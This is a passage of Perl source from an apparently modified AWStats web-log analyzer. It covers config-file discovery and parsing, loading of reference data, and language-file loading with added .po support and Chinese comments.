	foreach my $family ( keys %BrowsersFamily ) {
		if ( $a =~ /^$family/i ) {
			$a =~ m/^(\D+)([\d\.]+)?$/;
			$a_family = $1;
			@a_ver = split( /\./, $2 );
		}
	}
	my $b_family = $b;
	my @b_ver    = ();
	foreach my $family ( keys %BrowsersFamily ) {
		if ( $b =~ /^$family/i ) {
			$b =~ m/^(\D+)([\d\.]+)?$/;
			$b_family = $1;
			@b_ver = split( /\./, $2 );
		}
	}

	my $compare = 0;
	my $done    = 0;

	$compare = $a_family cmp $b_family;
	if ( $compare != 0 ) {
		return $compare;
	}

	while ( !$done ) {
		my $a_num = shift @a_ver || 0;
		my $b_num = shift @b_ver || 0;

		$compare = $a_num <=> $b_num;
		if ( $compare != 0
			|| ( scalar(@a_ver) == 0 && scalar(@b_ver) == 0 && $compare == 0 ) )
		{
			$done = 1;
		}
	}

	return $compare;
}

#------------------------------------------------------------------------------
# Function:     Read config file
# Parameters:	None or configdir to scan
# Input:        $DIR $PROG $SiteConfig
# Output:		Global variables
# Return:		-
#------------------------------------------------------------------------------
sub Read_Config {

	# Check config file in common possible directories :
	# Windows :                   				"$DIR" (same dir than awstats.pl)
	# Standard, Mandrake and Debian package :	"/etc/awstats"
	# Other possible directories :				"/usr/local/etc/awstats",
	# FHS standard, Suse package : 				"/etc/opt/awstats"
	my $configdir         = shift;
	my @PossibleConfigDir = (
			"$DIR",
			"/etc/awstats",
			"/usr/local/etc/awstats",
			"/etc/opt/awstats"
		); 

	if ($configdir) {
		# Check if configdir is outside default values.
		my $outsidedefaultvalue=1;
		foreach (@PossibleConfigDir) {
			if ($_ eq $configdir) { $outsidedefaultvalue=0; last; }
		}

		# If from CGI, overwriting of configdir with a value that differs from a default value
		# is only possible if AWSTATS_ENABLE_CONFIG_DIR defined.
		# AWSTATS_ENABLE_CONFIG_DIR must contains dir allowed
		if ($ENV{'GATEWAY_INTERFACE'} && $outsidedefaultvalue)
		{
			if (! $ENV{"AWSTATS_ENABLE_CONFIG_DIR"})
			{
				error("Sorry, to allow overwriting of configdir parameter, from an AWStats CGI page, with a non default value, environment variable AWSTATS_ENABLE_CONFIG_DIR must be set to full path of allowed directory. For example, by adding the line 'SetEnv AWSTATS_ENABLE_CONFIG_DIR /mydirofconf' in your Apache config file or into a .htaccess file.");
			}
			else
			{
				if ($configdir !~ $ENV{"AWSTATS_ENABLE_CONFIG_DIR"})
				{
					error("Sorry, using configdir parameter from an AWStats CGI page is possible only if parameter configdir is a directory defined into environment variable AWSTATS_ENABLE_CONFIG_DIR");
				}
			}
		}

		@PossibleConfigDir = ("$configdir");
	}

	# Open config file
	$FileConfig = $FileSuffix = '';
	foreach (@PossibleConfigDir) {
		my $searchdir = $_;
		if ( $searchdir && $searchdir !~ /[\\\/]$/ ) { $searchdir .= "/"; }
		
		if ( -f $searchdir.$PROG.".".$SiteConfig.".conf" &&  open( CONFIG, "<$searchdir$PROG.$SiteConfig.conf" ) ) {
			$FileConfig = "$searchdir$PROG.$SiteConfig.conf";
			$FileSuffix = ".$SiteConfig";
			if ($Debug){debug("Opened config: $searchdir$PROG.$SiteConfig.conf", 2);}
			last;
		}else{if ($Debug){debug("Unable to open config file: $searchdir$PROG.$SiteConfig.conf", 2);}}
		
		if ( -f $searchdir.$PROG.".conf" &&  open( CONFIG, "$searchdir$PROG.conf" ) ) {
			$FileConfig = "$searchdir$PROG.conf";
			$FileSuffix = '';
			if ($Debug){debug("Opened config: $searchdir$PROG.conf", 2);}
			last;
		}else{if ($Debug){debug("Unable to open config file: $searchdir$PROG.conf", 2);}}
		
		# Added to open config if file name is passed to awstats 
		if ( -f $searchdir.$SiteConfig && open( CONFIG, "$searchdir$SiteConfig" ) ) {
			$FileConfig = "$searchdir$SiteConfig";
			$FileSuffix = '';
			if ($Debug){debug("Opened config: $searchdir$SiteConfig", 2);}
			last;
		}else{if ($Debug){debug("Unable to open config file: $searchdir$SiteConfig", 2);}}
	}
	
	#CL - Added to open config if full path is passed to awstats
	# Disabled by LDR for security reason.
	# If we need to execute config into other dir 
	#if ( !$FileConfig ) {
	#	
	#	my $SiteConfigBis = File::Spec->rel2abs($SiteConfig);
	#	debug("Finally, try to open an absolute path : $SiteConfigBis", 2);
	#
	#	if ( -f $SiteConfigBis && open(CONFIG, "$SiteConfigBis")) {
	#		$FileConfig = "$SiteConfigBis";
	#		$FileSuffix = '';
	#		if ($Debug){debug("Opened config: $SiteConfigBis", 2);}
	#		$SiteConfig=$SiteConfigBis;
	#	}
	#	else {
	#		if ($Debug){debug("Unable to open config file: $SiteConfigBis", 2);}
	#	}
	#}
	
	if ( !$FileConfig ) {
		if ($DEBUGFORCED || !$ENV{'GATEWAY_INTERFACE'}){
		error(
"Couldn't open config file \"$PROG.$SiteConfig.conf\", nor \"$PROG.conf\", nor \"$SiteConfig\" after searching in path \""
			  . join( ', ', @PossibleConfigDir )
			  . ", $SiteConfig\": $!" );
		}else{error("Couldn't open config file \"$PROG.$SiteConfig.conf\" nor \"$PROG.conf\". 
		Please read the documentation for directories where the configuration file should be located."); }
	}

	# Analyze config file content and close it
	&Parse_Config( *CONFIG, 1, $FileConfig );
	close CONFIG;

	# If parameter NotPageList not found, init for backward compatibility
	if ( !$FoundNotPageList ) {
		%NotPageList = (
			'css'   => 1,
			'js'    => 1,
			'class' => 1,
			'gif'   => 1,
			'jpg'   => 1,
			'jpeg'  => 1,
			'png'   => 1,
			'bmp'   => 1,
			'ico'   => 1,
			'rss'   => 1,
			'swf'   => 1,
			'webp'  => 1,
			'xml'   => 1,
			'eot'   => 1,
			'woff'  => 1,
			'woff2' => 1
		);
	}

	# If parameter ValidHTTPCodes empty, init for backward compatibility
	if ( !scalar keys %ValidHTTPCodes ) {
		$ValidHTTPCodes{"200"} = $ValidHTTPCodes{"304"} = 1;
	}

	# If parameter ValidSMTPCodes empty, init for backward compatibility
	if ( !scalar keys %ValidSMTPCodes ) {
		$ValidSMTPCodes{"1"} = $ValidSMTPCodes{"250"} = 1;
	}

	# If parameter TrapInfosForHTTPErrorCodes empty, init to default
	if ( !scalar keys %TrapInfosForHTTPErrorCodes ) {
		$TrapInfosForHTTPErrorCodes{"404"} = 1;
	}
	# ===== 重构版本新增：默认启用 geoipfree 插件 =====
	# 如果没有任何 geoip 插件被加载，自动启用 geoipfree
	my $has_geoip = 0;
	foreach my $plugin (@PluginsToLoad) {
		if ($plugin =~ /geoip/) {
			$has_geoip = 1;
			last;
		}
	}
	
	if (!$has_geoip) {
		push @PluginsToLoad, "geoipfree";
		if ($Debug) {
			debug("重构版本: 默认启用 geoipfree 插件（无其他 geoip 插件时）");
		}
	}
}

#------------------------------------------------------------------------------
# Function:     Parse content of a config file
# Parameters:	opened file handle, depth level, file name
# Input:        -
# Output:		Global variables
# Return:		-
#------------------------------------------------------------------------------
sub Parse_Config {
	my ($confighandle) = $_[0];
	my $level          = $_[1];
	my $configFile     = $_[2];
	my $versionnum     = 0;
	my $conflinenb     = 0;

	if ( $level > 10 ) {
		error(
"$PROG can't read down more than 10 level of includes. Check that no 'included' config files include their parent config file (this cause infinite loop)."
		);
	}

	while (<$confighandle>) {
		chomp $_;
		s/\r//;
		$conflinenb++;

		# Extract version from first line
		if ( !$versionnum && $_ =~ /^# AWSTATS CONFIGURE FILE (\d+).(\d+)/i ) {
			$versionnum = ( $1 * 1000 ) + $2;

			#if ($Debug) { debug(" Configure file version is $versionnum",1); }
			next;
		}

		if ( $_ =~ /^\s*$/ ) { next; }

		# Check includes
		if ( $_ =~ /^Include "([^\"]+)"/ || $_ =~ /^#include "([^\"]+)"/ )
		{    # #include kept for backward compatibility
			my $includeFile = $1;

			# Expand __var__ by values
			while ( $includeFile =~ /__([^\s_]+(?:_[^\s_]+)*)__/ ) {
				my $var = $1;
				$includeFile =~ s/__${var}__/$ENV{$var}/g;
			}
			if ($Debug) { debug( "Found an include : $includeFile", 2 ); }
			if ( $includeFile !~ /^([a-zA-Z]:)?[\\\/]/ ) {
				# Correct relative include files
				if ( $FileConfig =~ /^(.*[\\\/])[^\\\/]*$/ ) {
					$includeFile = "$1$includeFile";
				}
			}
			if ( $level > 1 && $^V lt v5.6.0 ) {
				warning(
"Warning: Perl versions before 5.6 cannot handle nested includes"
				);
				next;
			}
            local( *CONFIG_INCLUDE );   # To avoid having parent file closed when include file is closed
			if ( open( CONFIG_INCLUDE, "<$includeFile" ) ) {
				&Parse_Config( *CONFIG_INCLUDE, $level + 1, $includeFile );
				close(CONFIG_INCLUDE);
			}
			else {
				error("Could not open include file: $includeFile");
			}
			next;
		}

		# Remove comments
		if ( $_ =~ /^\s*#/ ) { next; }
		$_ =~ s/\s#.*$//;

		# Extract param and value
		my ( $param, $value ) = split( /=/, $_, 2 );
		$param =~ s/^\s+//;
		$param =~ s/\s+$//;

		# If not a param=value, try with next line
		if ( !$param ) {
			warning(
"Warning: Syntax error line $conflinenb in file '$configFile'. Config line is ignored."
			);
			next;
		}
		if ( !defined $value ) {
			warning(
"Warning: Syntax error line $conflinenb in file '$configFile'. Config line is ignored."
			);
			next;
		}

		if ($value) {
			$value =~ s/^\s+//;
			$value =~ s/\s+$//;
			$value =~ s/^\"//;
			$value =~ s/\";?$//;

			# Replace __MONENV__ with value of environnement variable MONENV
			# Must be able to replace __VAR_1____VAR_2__
			while ( $value =~ /__([^\s_]+(?:_[^\s_]+)*)__/ ) {
				my $var = $1;
				$value =~ s/__${var}__/$ENV{$var}/g;
			}
		}

		# Initialize parameter for (param,value)
		if ( $param =~ /^LogFile/ ) {
			if ( $QueryString !~ /logfile=([^\s&]+)/i ) { $LogFile = $value; }
			next;
		}
		if ( $param =~ /^DirIcons/ ) {
			if ( $QueryString !~ /diricons=([^\s&]+)/i ) { $DirIcons = $value; }
			next;
		}
		if ( $param =~ /^SiteDomain/ ) {

			# No regex test as SiteDomain is always exact value
			$SiteDomain = $value;

  			if ($SiteDomain =~ m/xn--/) 
  			{
				# TODO Add code to test if IDNA::Punycode module is on
				#use IDNA::Punycode;
				$DecodePunycode=0;	# Set to 1 if module is on	
  				if ($DecodePunycode)
  				{
	                idn_prefix(undef);
	                my @parts = split(/\./, $SiteDomain);
	                foreach (@parts) {
	                	if ($_ =~ s/^xn--//) {
	                    	eval { $_ = decode_punycode($_); };
	                        if (my $e = $@) { $_ = $e; }
	                    }
	                }
	                $SiteDomain = join('.', @parts);
  				}
            }
                        			
			next;
		}
		if ( $param =~ /^AddLinkToExternalCGIWrapper/ ) {

			# No regex test as AddLinkToExternalCGIWrapper is always exact value
			$AddLinkToExternalCGIWrapper = $value;
			next;
        }
		if ( $param =~ /^HostAliases/ ) {
			@HostAliases = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ s/^\@// ) {    # If list of hostaliases in a file
					open( DATAFILE, "<$elem" )
					  || error(
"Failed to open file '$elem' declared in HostAliases parameter"
					  );
					my @val = map( /^(.*)$/i, <DATAFILE> );
					push @HostAliases, map { qr/^$_$/i } @val;
					close(DATAFILE);
				}
				else {
					if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
					else { $elem = '^' . quotemeta($elem) . '$'; }
					if ($elem) { push @HostAliases, qr/$elem/i; }
				}
			}
			next;
		}

		# Special optional setup params
		if ( $param =~ /^SkipDNSLookupFor/ ) {
			@SkipDNSLookupFor = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @SkipDNSLookupFor, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^AllowAccessFromWebToFollowingAuthenticatedUsers/ ) {
			@AllowAccessFromWebToFollowingAuthenticatedUsers = ();
			foreach ( split( /\s+/, $value ) ) {
				push @AllowAccessFromWebToFollowingAuthenticatedUsers, $_;
			}
			next;
		}
		if ( $param =~ /^DefaultFile/ ) {
			@DefaultFile = ();
			foreach my $elem ( split( /\s+/, $value ) ) {

				# No REGEX for this option
				#if ($elem =~ /^REGEX\[(.*)\]$/i) { $elem=$1; }
				#else { $elem='^'.quotemeta($elem).'$'; }
				if ($elem) { push @DefaultFile, $elem; }
			}
			next;
		}
		if ( $param =~ /^SkipHosts/ ) {
			@SkipHosts = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @SkipHosts, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^SkipReferrersBlackList/ && $value ) {
			open( BLACKLIST, "<$value" )
			  || die "Failed to open blacklist: $!\n";
			while (<BLACKLIST>) {
				chomp;
				my $elem = $_;
				$elem =~ s/ //;
				$elem =~ s/\#.*//;
				if ($elem) { push @SkipReferrers, qr/$elem/i; }
			}
			next;
			close(BLACKLIST);
		}
		if ( $param =~ /^SkipUserAgents/ ) {
			@SkipUserAgents = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @SkipUserAgents, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^SkipFiles/ ) {
			@SkipFiles = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @SkipFiles, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^OnlyHosts/ ) {
			@OnlyHosts = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @OnlyHosts, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^OnlyUsers/ ) {
			@OnlyUsers = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @OnlyUsers, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^OnlyUserAgents/ ) {
			@OnlyUserAgents = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @OnlyUserAgents, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^OnlyFiles/ ) {
			@OnlyFiles = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @OnlyFiles, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^NotPageFiles/ ) {
			@NotPageFiles = ();
			foreach my $elem ( split( /\s+/, $value ) ) {
				if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
				else { $elem = '^' . quotemeta($elem) . '$'; }
				if ($elem) { push @NotPageFiles, qr/$elem/i; }
			}
			next;
		}
		if ( $param =~ /^NotPageList/ ) {
			%NotPageList = ();
			foreach ( split( /\s+/, $value ) ) { $NotPageList{$_} = 1; }
			$FoundNotPageList = 1;
			next;
		}
		if ( $param =~ /^ValidHTTPCodes/ ) {
			%ValidHTTPCodes = ();
			foreach ( split( /\s+/, $value ) ) { $ValidHTTPCodes{$_} = 1; }
			next;
		}
		if ( $param =~ /^ValidSMTPCodes/ ) {
			%ValidSMTPCodes = ();
			foreach ( split( /\s+/, $value ) ) { $ValidSMTPCodes{$_} = 1; }
			next;
		}
		if ( $param =~ /^TrapInfosForHTTPErrorCodes/ ) {
			%TrapInfosForHTTPErrorCodes = ();
			foreach ( split( /\s+/, $value ) ) { $TrapInfosForHTTPErrorCodes{$_} = 1; }
			next;
		}
		if ( $param =~ /^URLWithQueryWithOnlyFollowingParameters$/ ) {
			@URLWithQueryWithOnly = split( /\s+/, $value );
			next;
		}
		if ( $param =~ /^URLWithQueryWithoutFollowingParameters$/ ) {
			@URLWithQueryWithout = split( /\s+/, $value );
			next;
		}

		# Extra parameters
		if ( $param =~ /^ExtraSectionName(\d+)/ ) {
			$ExtraName[$1] = $value;
			next;
		}
		if ( $param =~ /^ExtraSectionCodeFilter(\d+)/ ) {
			@{ $ExtraCodeFilter[$1] } = split( /\s+/, $value );
			next;
		}
		if ( $param =~ /^ExtraSectionCondition(\d+)/ ) {
			$ExtraCondition[$1] = $value;
			next;
		}
		if ( $param =~ /^ExtraSectionStatTypes(\d+)/ ) {
			$ExtraStatTypes[$1] = $value;
			next;
		}
		if ( $param =~ /^ExtraSectionFirstColumnTitle(\d+)/ ) {
			$ExtraFirstColumnTitle[$1] = $value;
			next;
		}
		if ( $param =~ /^ExtraSectionFirstColumnValues(\d+)/ ) {
			$ExtraFirstColumnValues[$1] = $value;
			next;
		}
		if ( $param =~ /^ExtraSectionFirstColumnFunction(\d+)/ ) {
			$ExtraFirstColumnFunction[$1] = $value;
			next;
		}
		if ( $param =~ /^ExtraSectionFirstColumnFormat(\d+)/ ) {
			$ExtraFirstColumnFormat[$1] = $value;
			next;
		}
		if ( $param =~ /^ExtraSectionAddAverageRow(\d+)/ ) {
			$ExtraAddAverageRow[$1] = $value;
			next;
		}
		if ( $param =~ /^ExtraSectionAddSumRow(\d+)/ ) {
			$ExtraAddSumRow[$1] = $value;
			next;
		}
		if ( $param =~ /^MaxNbOfExtra(\d+)/ ) {
			$MaxNbOfExtra[$1] = $value;
			next;
		}
		if ( $param =~ /^MinHitExtra(\d+)/ ) {
			$MinHitExtra[$1] = $value;
			next;
		}

		# Plugins
		if ( $param =~ /^LoadPlugin/ ) {
			$value =~ s/[^a-zA-Z0-9_\/\.\+:=\?\s%\-]//g;		# Sanitize plugin name and string param because it is used later in an eval.
			push @PluginsToLoad, $value; next; 
		}

	  # Other parameter checks we need to put after MaxNbOfExtra and MinHitExtra
		if ( $param =~ /^MaxNbOf(\w+)/ ) { $MaxNbOf{$1} = $value; next; }
		if ( $param =~ /^MinHit(\w+)/ )  { $MinHit{$1}  = $value; next; }

# Check if this is a known parameter
#		if (! $ConfOk{$param}) { error("Unknown config parameter '$param' found line $conflinenb in file \"configFile\""); }
# If parameters was not found previously, defined variable with name of param to value
		$$param = $value;
	}

	if ($Debug) {
		debug("Config file read was \"$configFile\" (level $level)");
	}
}

#------------------------------------------------------------------------------
# Function:     Load the reference databases
# Parameters:	List of files to load
# Input:		$DIR
# Output:		Arrays and Hash tables are defined
# Return:       -
#------------------------------------------------------------------------------
sub Read_Ref_Data {

# Check lib files in common possible directories :
# Windows and standard package:        		"$DIR/lib" (lib in same dir than awstats.pl)
# Debian package:                    		"/usr/share/awstats/lib"
	my @PossibleLibDir = ( "$DIR/lib", "/usr/share/awstats/lib" );
	my %FilePath       = ();
	my %DirAddedInINC  = ();
	my @FileListToLoad = ();
	while ( my $file = shift ) { push @FileListToLoad, "$file.pm"; }
	if ($Debug) {
		debug( "Call to Read_Ref_Data with files to load: "
			  . ( join( ',', @FileListToLoad ) ) );
	}
	foreach my $file (@FileListToLoad) {
		foreach my $dir (@PossibleLibDir) {
			my $searchdir = $dir;
			if (   $searchdir
				&& ( !( $searchdir =~ /\/$/ ) )
				&& ( !( $searchdir =~ /\\$/ ) ) )
			{
				$searchdir .= "/";
			}
			if ( !$FilePath{$file} )
			{    # To not load twice same file in different path
				if ( -s "${searchdir}${file}" ) {
					$FilePath{$file} = "${searchdir}${file}";
					if ($Debug) {
						debug(
"Call to Read_Ref_Data [FilePath{$file}=\"$FilePath{$file}\"]"
						);
					}

					# Note: cygwin perl 5.8 need a push + require file
					if ( !$DirAddedInINC{"$dir"} ) {
						push @INC, "$dir";
						$DirAddedInINC{"$dir"} = 1;
					}
					my $loadret = require "$file";

				   #my $loadret=(require "$FilePath{$file}"||require "${file}");
				}
			}
		}
		if ( !$FilePath{$file} ) {
			my $filetext = $file;
			$filetext =~ s/\.pm$//;
			$filetext =~ s/_/ /g;
			warning(
"Warning: Can't read file \"$file\" ($filetext detection will not work correctly).\nCheck if file is in \""
				  . ( $PossibleLibDir[0] )
				  . "\" directory and is readable." );
		}
	}

	# Sanity check (if loaded)
	if ( ( scalar keys %OSHashID )
		&& @OSSearchIDOrder != scalar keys %OSHashID )
	{
		error(  "Not same number of records of OSSearchIDOrder ("
			  . (@OSSearchIDOrder)
			  . " entries) and OSHashID ("
			  . ( scalar keys %OSHashID )
			  . " entries) in OS database. Check your file "
			  . $FilePath{"operating_systems.pm"} );
	}
	if (
		( scalar keys %SearchEnginesHashID )
		&& ( @SearchEnginesSearchIDOrder_list1 +
			@SearchEnginesSearchIDOrder_list2 +
			@SearchEnginesSearchIDOrder_listgen ) != scalar
		keys %SearchEnginesHashID
	  )
	{
		error(
"Not same number of records of SearchEnginesSearchIDOrder_listx (total is "
			  . (
				@SearchEnginesSearchIDOrder_list1 +
				  @SearchEnginesSearchIDOrder_list2 +
				  @SearchEnginesSearchIDOrder_listgen
			  )
			  . " entries) and SearchEnginesHashID ("
			  . ( scalar keys %SearchEnginesHashID )
			  . " entries) in Search Engines database. Check your file "
			  . $FilePath{"search_engines.pm"}
			  . " is up to date."
		);
	}
	if ( ( scalar keys %BrowsersHashIDLib )
		&& @BrowsersSearchIDOrder != ( scalar keys %BrowsersHashIDLib ) - ( scalar keys %BrowsersFamily ) )
	{
		#foreach (sort keys %BrowsersHashIDLib)
		#{
		#	print $_."\n";
		#}
		#foreach (sort @BrowsersSearchIDOrder)
		#{
		#	print $_."\n";
		#}
		error(  "Not same number of records of BrowsersSearchIDOrder ("
			  . (@BrowsersSearchIDOrder)
			  . " entries) and BrowsersHashIDLib ("
			  . ( ( scalar keys %BrowsersHashIDLib ) - ( scalar keys %BrowsersFamily ) )
			  . " entries without firefox,opera,chrome,safari,konqueror,svn,msie,netscape,edge) in Browsers database. May be you updated AWStats without updating browsers.pm file or you made changed into browsers.pm not correctly. Check your file "
			  . $FilePath{"browsers.pm"}
			  . " is up to date." );
	}
	if (
		( scalar keys %RobotsHashIDLib )
		&& ( @RobotsSearchIDOrder_list1 + @RobotsSearchIDOrder_list2 +
			@RobotsSearchIDOrder_listgen ) !=
		( scalar keys %RobotsHashIDLib ) - 1
	  )
	{
		error(
			"Not same number of records of RobotsSearchIDOrder_listx (total is "
			  . (
				@RobotsSearchIDOrder_list1 + @RobotsSearchIDOrder_list2 +
				  @RobotsSearchIDOrder_listgen
			  )
			  . " entries) and RobotsHashIDLib ("
			  . ( ( scalar keys %RobotsHashIDLib ) - 1 )
			  . " entries without 'unknown') in Robots database. Check your file "
			  . $FilePath{"robots.pm"}
			  . " is up to date."
		);
	}
}

#------------------------------------------------------------------------------
# Function:     Get the messages for a specified language
# Parameters:	LanguageId
# Input:		$DirLang $DIR
# Output:		$Message table is defined in memory, %translate_map is populated
# Return:		None
#------------------------------------------------------------------------------
sub Read_Language_Data {
    my $lang = shift || 'en';
    
    # 如果 $lang 是 'auto'，从浏览器检测
    if ( $lang eq 'auto' && $ENV{'HTTP_ACCEPT_LANGUAGE'} ) {
        my @accept = split /,/, $ENV{'HTTP_ACCEPT_LANGUAGE'};
        foreach my $lang_pref (@accept) {
            $lang_pref =~ s/;.*//;           # 去掉 q=0.9
            $lang_pref =~ s/^\s+|\s+$//g;    # 去掉空格
            $lang_pref = lc($lang_pref);
            $lang_pref =~ s/_/-/g;            # 统一用 - 分隔符
            
            # 1. 尝试完整匹配（zh-cn, pt-br）
            if ( $LangBrowserToLangAwstats{$lang_pref} ) {
                $lang = $LangBrowserToLangAwstats{$lang_pref};
                last;
            }
            
            # 2. 尝试前两个字符（zh, pt）
            my $short = substr($lang_pref, 0, 2);
            if ( $LangBrowserToLangAwstats{$short} ) {
                $lang = $LangBrowserToLangAwstats{$short};
                last;
            }
        }
        
        # 3. 如果都没找到，用第一个语言的前两个字符
        if ( $lang eq 'auto' && $accept[0] ) {
            my $first = $accept[0];
            $first =~ s/;.*//;
            $first =~ s/^\s+|\s+$//g;
            $first = lc($first);
            $first =~ s/_/-/g;
            my $short = substr($first, 0, 2);
            if ( $LangBrowserToLangAwstats{$short} ) {
                $lang = $LangBrowserToLangAwstats{$short};
            }
        }
    }

    # 检查语言文件的可能目录
    my @PossibleLangDir = ( "$DirLang", "$DIR/lang", "/usr/share/awstats/lang" );

    my $FileLang = '';
    my $is_po = 0;
    
    foreach my $dir (@PossibleLangDir) {
        my $searchdir = $dir;
        
        if ( $searchdir =~ /\|/ ) {
            error("DirLang parameter can't contains character |");
            next;
        }
        
        if ( $searchdir && !( $searchdir =~ /\/$/ ) && !( $searchdir =~ /\\$/ ) ) {
            $searchdir .= "/";
        }
        
        # 尝试 .po 文件
        my $pofile = "${searchdir}awstats-$lang.po";
        if ( -f $pofile ) {
            $FileLang = $pofile;
            $is_po = 1;
            last;
        }
        
        # 尝试下划线格式
        my $lang_underscore = $lang;
        $lang_underscore =~ s/-/_/g;
        if ( $lang_underscore ne $lang ) {
            $pofile = "${searchdir}awstats-${lang_underscore}.po";
            if ( -f $pofile ) {
                $FileLang = $pofile;
                $is_po = 1;
                last;
            }
        }
        
        # 回退到 .txt
        my $txtfile = "${searchdir}awstats-$lang.txt";
        if ( -f $txtfile ) {
            $FileLang = $txtfile;
            $is_po = 0;
            last;
        }
    }

    # 如果没找到，尝试英文
    if ( !$FileLang ) {
        foreach my $dir (@PossibleLangDir) {
            my $searchdir = $dir;
            if ( $searchdir && !( $searchdir =~ /\/$/ ) && !( $searchdir =~ /\\$/ ) ) {
                $searchdir .= "/";
            }
            
            my $pofile = "${searchdir}awstats-en.po";
            if ( -f $pofile ) {
                $FileLang = $pofile;
                $is_po = 1;
                last;
            }
            
            my $txtfile = "${searchdir}awstats-en.txt";
            if ( -f $txtfile ) {
                $FileLang = $txtfile;
                $is_po = 0;
                last;
            }
        }
    }

    if ($Debug) {
        debug("Call to Read_Language_Data [FileLang=\"$FileLang\", is_po=$is_po]");
    }

    if ($FileLang) {
        if ($is_po) {
            parse_po_file($FileLang);
        }
        else {
            parse_txt_file($FileLang);
        }
    }
    else {
        warning( sprintf(
            _t("Warning: Can't find language files for \"%s\". English will be used."),
            $lang
        ));
    }

    $PageCode = 'utf-8';
    $PageDir = 0;

    if ( $LogType eq 'M' ) {
        $translate_map{"First"} = _t("First");
        $translate_map{"Last"} = _t("Last");
        $translate_map{"Mails"} = _t("Mails");
        $translate_map{"Size"} = _t("Size");
    }
}

#------------------------------------------------------------------------------
# Function:     Parse .po file and load messages
# Parameters:	.po file path
# Output:		$Message array and %translate_map are populated
# Return:		None
#------------------------------------------------------------------------------
sub parse_po_file {
	my $pofile = shift;
	
	if ( !open(PO, "<:encoding(UTF-8)", $pofile) ) {
		warning("Warning: Cannot open .po file: $pofile");
		return;
	}
	
	my $msgid = '';
	my $msgstr = '';
	my $in_msgid = 0;
	my $in_msgstr = 0;
	
	while (<PO>) {
		chomp;
		
		# 跳过注释
		next if /^#/;
		
		if (/^msgid\s+"(.*)"/) {
			# 保存之前的翻译
			if ($msgid && $msgstr) {
				store_translation($msgid, $msgstr);
			}
			$msgid = $1;
			$msgstr = '';
			$in_msgid = 1;
			$in_msgstr = 0;
		}
		elsif (/^msgstr\s+"(.*)"/) {
			$msgstr = $1;
			$in_msgid = 0;
			$in_msgstr = 1;
		}
		elsif (/^"(.*)"/) {
			if ($in_msgid) {
				$msgid .= $1;
			}
			elsif ($in_msgstr) {
				$msgstr .= $1;
			}
		}
	}
	
	# 保存最后一条翻译
	if ($msgid && $msgstr) {
		store_translation($msgid, $msgstr);
	}
	
	close(PO);
}

#------------------------------------------------------------------------------
# Function:     Parse old .txt file and load messages (backward compatibility)
# Parameters:	.txt file path
# Output:		$Message array is populated
# Return:		None
#------------------------------------------------------------------------------
sub parse_txt_file {
	my $txtfile = shift;
	
	if ( !open(TXT, "<:encoding(GBK)", $txtfile) ) {
		warning("Warning: Cannot open .txt file: $txtfile");
		return;
	}
	
	my $i = 0;
	my $cregcode    = qr/^PageCode=[\t\s\"\']*([\w-]+)/i;
	my $cregdir     = qr/^PageDir=[\t\s\"\']*([\w-]+)/i;
	my $cregmessage = qr/^Message\d+=/i;
	
	while (<TXT>) {
		chomp;
		s/\r//;
		
		if ( $_ =~ /$cregcode/o ) {
			$PageCode = $1;
			next;
		}
		if ( $_ =~ /$cregdir/o ) {
			$PageDir = $1;
			next;
		}
		if ( $_ =~ s/$cregmessage//o ) {
			$_ =~ s/^#.*//;
			$_ =~ s/\s+#.*//;
			$_ =~ tr/\t /  /s;
			$_ =~ s/^\s+//;
			$_ =~ s/\s+$//;
			$_ =~ s/^\"//;
			$_ =~ s/\"$//;
			$Message[$i] = $_;
			
			# 同时存入翻译映射表
			$translate_map{$i} = $_;
			$i++;
		}
	}
	
	close(TXT);
}

#------------------------------------------------------------------------------
# Function:     Store translation in appropriate arrays
# Parameters:	msgid, msgstr
# Output:		$Message array and %translate_map are updated
# Return:		None
#------------------------------------------------------------------------------
sub store_translation {
    my ($msgid, $msgstr) = @_;
    
    # 存入哈希表
    $translate_map{$msgid} = $msgstr;
    
    # 特殊处理 PageCode 和 PageDir
    if ( $msgid eq 'PageCode' ) {
        $PageCode = $msgstr;
    }
    elsif ( $msgid eq 'PageDir' ) {
        $PageDir = $msgstr;
    }
}

#------------------------------------------------------------------------------
# Function:     Substitute date tags in a string by value
# Parameters:	String
# Input:		All global variables
# Output:		Change on some global variables
# Return:		String
#------------------------------------------------------------------------------
sub Substitute_Tags {
	my $SourceString = shift;
